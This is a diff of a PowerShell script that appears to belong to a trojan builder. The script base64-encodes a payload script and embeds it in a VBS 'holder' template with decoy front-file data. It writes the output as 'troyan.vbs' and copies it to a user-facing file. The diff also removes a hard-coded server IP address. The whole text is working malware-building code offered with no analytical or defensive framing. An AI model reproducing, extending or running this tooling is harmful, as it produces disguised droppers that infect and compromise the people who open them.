@@ -1,12 +1,11 @@
 param (
     [string]$serverName
 )
-$serverName="185.247.141.76"
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
 }
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
-. ../../sys/current.ps1  -serverName $serverName
+& (Join-Path -Path $scriptDir -ChildPath "../../sys/current.ps1") -serverName $serverName
 
 
 
@@ -82,7 +81,7 @@ function Create-EmbeddingFiles {
 }
 
 
-$body = Encode-FileToBase64 -inFile (Join-Path -Path $scriptDir -ChildPath "../troyandelphi/_baza.ps1")
+$body = Encode-FileToBase64 -inFile $server.troyanScript
 
 $holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")
 
@@ -94,4 +93,5 @@ $result = $result -replace '"__frontData"', $data
 $result = $result -replace '"__frontName"', $name
 
 
-$result | Set-Content -Path (Join-Path -Path $scriptDir -ChildPath "troyan.vbs")
+$result | Set-Content $server.troyanVbsFile
+Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
